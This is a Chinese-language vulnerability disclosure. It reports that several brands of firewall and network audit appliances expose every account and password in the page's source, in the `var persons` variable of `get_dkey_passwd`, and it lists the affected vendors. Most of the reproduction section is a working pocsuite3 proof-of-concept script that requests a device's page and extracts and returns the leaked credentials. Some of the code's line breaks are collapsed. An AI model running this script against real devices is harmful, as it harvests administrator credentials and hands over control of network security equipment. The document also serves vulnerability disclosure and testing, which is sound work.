# 多款网络设备存在密码泄露

### 漏洞简介

多款防火墙、上网行为管理等网络设备存在密码泄露，攻击者可以通过审查网页源代码获取到用户账号和密码，登陆该设备，从而控制设备。

### 漏洞影响

•胜鑫塔下一代防火墙•利谱第二代防火墙•任子行下一代防火墙•任子行网络安全审计系统内置报表•中科网威下一代防火墙•网域科技防火墙•锐捷统一上网行为管理与审计系统•无锡城安CitySec•。。。。

### 漏洞复现

虽然影响多家设备，但是漏洞出现位置完全一致，感觉像是一套代码写的一样。

直接查看源代码，存在漏洞的设备的`get_dkey_passwd` 方法的 `var persons`直接输出了所有的账户密码。

```
#!/usr/bin/env python# -*- coding: utf-8 -*-import jsonimport re
import requests
from pocsuite3.lib.core.poc import POCBasefrom pocsuite3.lib.core.register import register_poc
class POC(POCBase):    name = '防火墙设备密码泄露'
    def check(self, url):        response = requests.get(url)        if 'var persons = [' in response.text:            res = re.findall('var persons = (.*?);', response.text, re.S | re.I)            if res:                data = json.loads(res[0])                result = {}                result['Name'] = self.name                result['Url'] = url                result['data'] = data                return result
register_poc(POC)
```
